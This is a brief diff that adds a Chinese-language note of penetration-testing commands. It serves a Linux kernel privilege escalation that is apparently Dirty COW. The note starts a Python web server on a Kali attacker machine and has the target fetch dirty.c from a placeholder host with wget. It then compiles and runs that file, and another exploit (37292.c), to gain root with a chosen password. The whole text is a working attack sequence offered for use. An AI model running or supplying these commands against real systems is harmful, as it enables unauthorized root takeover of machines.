@@ -1,0 +1,8 @@
+kali开启80服务：python -m SimpleHTTPServer 80
+靶机下载kali里面的dirty文件。
+wget http://xxxxxx/dirty.c
+靶机执行命令：
+1.编译gcc -pthread dirty.c -o exp -lcrypt
+2.执行./exp 密码
+
+gcc -pthread 37292.c -o exp -lcrypt
